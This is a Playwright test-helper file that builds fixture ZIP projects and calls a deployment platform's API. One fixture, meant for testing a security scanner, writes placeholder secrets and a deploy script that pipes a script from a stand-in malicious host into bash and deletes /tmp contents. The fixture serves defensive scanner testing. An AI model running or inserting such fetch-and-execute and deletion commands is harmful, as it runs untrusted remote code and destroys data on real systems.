import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { type APIRequestContext } from '@playwright/test';

const FIXTURES_DIR = path.join(__dirname, '../fixtures/zips');

/**
 * Ensure fixtures directory exists
 */
function ensureFixturesDir() {
  if (!fs.existsSync(FIXTURES_DIR)) {
    fs.mkdirSync(FIXTURES_DIR, { recursive: true });
  }
}

/**
 * Creates a minimal valid React project ZIP in memory using raw bytes.
 * We avoid the `archiver` npm dependency by hand-crafting a minimal ZIP.
 */
export function createValidReactZip(): string {
  ensureFixturesDir();
  const zipPath = path.join(FIXTURES_DIR, 'valid-react-project.zip');

  if (!fs.existsSync(zipPath)) {
    // Use Python-style minimal ZIP generation via Buffer manipulation
    // We'll write a real ZIP using the zip spec
    const files: Record<string, string> = {
      'package.json': JSON.stringify({
        name: 'playwright-test-app',
        version: '1.0.0',
        dependencies: { react: '^18.0.0', 'react-dom': '^18.0.0' },
        scripts: { build: 'vite build', dev: 'vite' },
      }, null, 2),
      'index.html': '<!DOCTYPE html><html><head><title>Test</title></head><body><div id="root"></div></body></html>',
      'src/App.jsx': 'export default function App() { return <div>Hello Playwright</div>; }',
      'src/main.jsx': 'import React from "react"; import ReactDOM from "react-dom/client"; import App from "./App"; ReactDOM.createRoot(document.getElementById("root")).render(<App />);',
      'vite.config.js': 'import { defineConfig } from "vite"; export default defineConfig({});',
    };

    // Write files to a temp directory and zip using native Node
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dm-test-'));
    for (const [filePath, content] of Object.entries(files)) {
      const fullPath = path.join(tmpDir, filePath);
      fs.mkdirSync(path.dirname(fullPath), { recursive: true });
      fs.writeFileSync(fullPath, content, 'utf-8');
    }

    // Create zip using child_process (available on all platforms)
    const { execSync } = require('child_process');
    try {
      execSync(`cd "${tmpDir}" && zip -r "${zipPath}" .`, { stdio: 'ignore' });
    } catch {
      // Windows fallback using PowerShell
      execSync(
        `powershell -Command "Compress-Archive -Path '${tmpDir}\\*' -DestinationPath '${zipPath}' -Force"`,
        { stdio: 'ignore' }
      );
    }

    // Clean up temp dir
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }

  return zipPath;
}

/**
 * Creates a ZIP with exposed secrets for security scanner testing.
 */
export function createSecretLeakZip(): string {
  ensureFixturesDir();
  const zipPath = path.join(FIXTURES_DIR, 'secret-leak-project.zip');

  if (!fs.existsSync(zipPath)) {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dm-secret-'));

    const files: Record<string, string> = {
      'package.json': JSON.stringify({ name: 'secret-app', version: '1.0.0' }, null, 2),
      '.env': [
        'GITHUB_TOKEN=ghp_abc123fakeTokenForTestingOnly456789xyz',
        'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE',
        'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
        'JWT_SECRET=super_secret_jwt_key_leaking_in_env',
      ].join('\n'),
      'config/database.js': `module.exports = {
  password: "hardcoded_db_password_123",
  apiKey: "sk-prod-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
};`,
      'scripts/deploy.sh': '#!/bin/bash\ncurl -sSL https://malicious.example.com/install.sh | bash\nrm -rf /tmp/*',
      'src/index.js': 'console.log("Hello World");',
    };

    for (const [filePath, content] of Object.entries(files)) {
      const fullPath = path.join(tmpDir, filePath);
      fs.mkdirSync(path.dirname(fullPath), { recursive: true });
      fs.writeFileSync(fullPath, content, 'utf-8');
    }

    const { execSync } = require('child_process');
    try {
      execSync(`cd "${tmpDir}" && zip -r "${zipPath}" .`, { stdio: 'ignore' });
    } catch {
      execSync(
        `powershell -Command "Compress-Archive -Path '${tmpDir}\\*' -DestinationPath '${zipPath}' -Force"`,
        { stdio: 'ignore' }
      );
    }
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }

  return zipPath;
}

/**
 * Creates a minimal FastAPI backend project ZIP.
 */
export function createFastAPIZip(): string {
  ensureFixturesDir();
  const zipPath = path.join(FIXTURES_DIR, 'fastapi-project.zip');

  if (!fs.existsSync(zipPath)) {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dm-fastapi-'));

    const files: Record<string, string> = {
      'requirements.txt': 'fastapi\nuvicorn\npython-multipart',
      'main.py': `from fastapi import FastAPI
app = FastAPI()

@app.get("/")
def root():
    return {"message": "Hello from FastAPI"}
`,
      'Dockerfile': `FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
`,
    };

    for (const [filePath, content] of Object.entries(files)) {
      const fullPath = path.join(tmpDir, filePath);
      fs.mkdirSync(path.dirname(fullPath), { recursive: true });
      fs.writeFileSync(fullPath, content, 'utf-8');
    }

    const { execSync } = require('child_process');
    try {
      execSync(`cd "${tmpDir}" && zip -r "${zipPath}" .`, { stdio: 'ignore' });
    } catch {
      execSync(
        `powershell -Command "Compress-Archive -Path '${tmpDir}\\*' -DestinationPath '${zipPath}' -Force"`,
        { stdio: 'ignore' }
      );
    }
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }

  return zipPath;
}

/**
 * Creates an oversized fake ZIP to test file size rejection.
 */
export function createOversizedZip(): string {
  ensureFixturesDir();
  const zipPath = path.join(FIXTURES_DIR, 'oversized.zip');

  if (!fs.existsSync(zipPath)) {
    // Write 101MB of zeros — exceeds the 100MB limit
    const SIZE = 101 * 1024 * 1024;
    const stream = fs.createWriteStream(zipPath);
    const chunk = Buffer.alloc(1024 * 1024, 0);
    for (let i = 0; i < 101; i++) stream.write(chunk);
    stream.end();
  }

  return zipPath;
}

/**
 * Creates a non-ZIP file disguised with .zip extension.
 */
export function createInvalidZip(): string {
  ensureFixturesDir();
  const zipPath = path.join(FIXTURES_DIR, 'invalid.zip');
  if (!fs.existsSync(zipPath)) {
    fs.writeFileSync(zipPath, 'This is NOT a zip file - just plain text content', 'utf-8');
  }
  return zipPath;
}

/**
 * Creates a non-ZIP file (e.g., .txt) to test extension rejection.
 */
export function createNonZipFile(): string {
  ensureFixturesDir();
  const txtPath = path.join(FIXTURES_DIR, 'readme.txt');
  if (!fs.existsSync(txtPath)) {
    fs.writeFileSync(txtPath, 'This is a text file, not a zip.', 'utf-8');
  }
  return txtPath;
}

/**
 * Helper: login via API and get auth token.
 */
export async function getAuthToken(
  request: APIRequestContext,
  email: string,
  password: string
): Promise<string> {
  const res = await request.post('/api/users/login', {
    data: { email, password },
  });
  const body = await res.json();
  return body.access_token;
}

/**
 * Helper: create a project via API directly (for tests that need a pre-existing project).
 */
export async function createProjectViaAPI(
  request: APIRequestContext,
  token: string,
  zipPath: string
): Promise<number> {
  const fileBuffer = fs.readFileSync(zipPath);
  const res = await request.post('/api/projects/upload', {
    headers: { Authorization: `Bearer ${token}` },
    multipart: {
      file: {
        name: path.basename(zipPath),
        mimeType: 'application/zip',
        buffer: fileBuffer,
      },
    },
  });

  const body = await res.json();
  return body.project_id;
}

/**
 * Helper: start a deployment via API directly.
 */
export async function startDeploymentViaAPI(
  request: APIRequestContext,
  token: string,
  projectId: number,
  provider = 'vercel'
): Promise<number> {
  const res = await request.post('/api/deployments/', {
    headers: { Authorization: `Bearer ${token}` },
    data: { project_id: projectId, provider, deploy_mode: 'production' },
  });
  const body = await res.json();
  return body.deployment_id;
}

/**
 * Helper: wait for a deployment to reach a terminal status via API polling.
 */
export async function waitForDeploymentStatus(
  request: APIRequestContext,
  token: string,
  deploymentId: number,
  targetStatuses: string[],
  timeoutMs = 120_000
): Promise<string> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const res = await request.get(`/api/deployments/${deploymentId}`, {
      headers: { Authorization: `Bearer ${token}` },
    });
    const body = await res.json();
    if (targetStatuses.includes(body.status)) return body.status;
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`Deployment ${deploymentId} did not reach status ${targetStatuses} within ${timeoutMs}ms`);
}
